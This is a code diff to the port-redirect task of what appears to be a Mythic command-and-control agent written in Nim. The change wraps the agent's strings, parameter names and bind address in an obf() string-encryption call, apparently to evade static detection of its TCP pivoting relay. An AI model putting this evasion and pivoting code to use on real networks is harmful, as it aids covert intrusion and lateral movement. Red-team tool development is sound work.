@@ -1,9 +1,7 @@
-## Redirect (Port Forward) task for direct TCP forwarding
-## Agent listens on local port and directly forwards to remote IP:port (no Mythic in data path)
-
 import std/[json, net, nativesockets, strformat, tables, os]
 import ../config
 import ../utils/mythic_responses
+import ../utils/strenc
 
 const BUFFER_SIZE = 8192
 
@@ -192,9 +190,9 @@ proc acceptConnections(listener: ptr RedirectListenerObj) {.thread.} =
 
 proc redirect*(taskId: string, params: JsonNode): JsonNode =
   ## Start/stop port redirect (direct TCP forwarding)
-  let action = params{"action"}.getStr("start")
+  let action = params[obf("action")].getStr("start")
   
-  if action == "stop":
+  if action == obf("stop"):
     # Stop existing listener
     if activeRedirectListeners.hasKey(taskId):
       let listener = activeRedirectListeners[taskId]
@@ -233,14 +231,14 @@ proc redirect*(taskId: string, params: JsonNode): JsonNode =
       dealloc(listener.sharedPtr)
       activeRedirectListeners.del(taskId)
       
-      return mythicSuccess(taskId, fmt"Stopped port redirect on port {listener.port}")
+      return mythicSuccess(taskId, obf("Successfully stopped port redirect") & fmt" on port {listener.port}")
     else:
-      return mythicError(taskId, "No active port redirect for this task")
+      return mythicError(taskId, obf("No active port redirect for this task"))
   
   # Start new listener
-  let port = params["port"].getInt()
-  let remoteIp = params["remote_ip"].getStr()
-  let remotePort = params["remote_port"].getInt()
+  let port = params[obf("port")].getInt()
+  let remoteIp = params[obf("remote_ip")].getStr()
+  let remotePort = params[obf("remote_port")].getInt()
   
   # Create listener socket
   var listenerSocket = newSocket()
@@ -248,10 +246,10 @@ proc redirect*(taskId: string, params: JsonNode): JsonNode =
   listenerSocket.getFd().setBlocking(true)
   
   try:
-    listenerSocket.bindAddr(Port(port), "0.0.0.0")
+    listenerSocket.bindAddr(Port(port), obf("0.0.0.0"))
     listenerSocket.listen()
   except OSError as e:
-    return mythicError(taskId, fmt"Failed to bind port {port}: {e.msg}")
+    return mythicError(taskId, obf("Failed to start listener on port ") & $port & ": " & e.msg)
   
   # Create listener object
   var listener = RedirectListener(
@@ -281,4 +279,4 @@ proc redirect*(taskId: string, params: JsonNode): JsonNode =
   activeRedirectListeners[taskId] = listener
   
   # Return completed status - redirect runs entirely in background
-  return mythicSuccess(taskId, fmt"Listening on 0.0.0.0:{port}, forwarding directly to {remoteIp}:{remotePort}")
+  return mythicSuccess(taskId, obf("Listening on 0.0.0.0:") & $port & obf(", forwarding directly to ") & remoteIp & ":" & $remotePort)
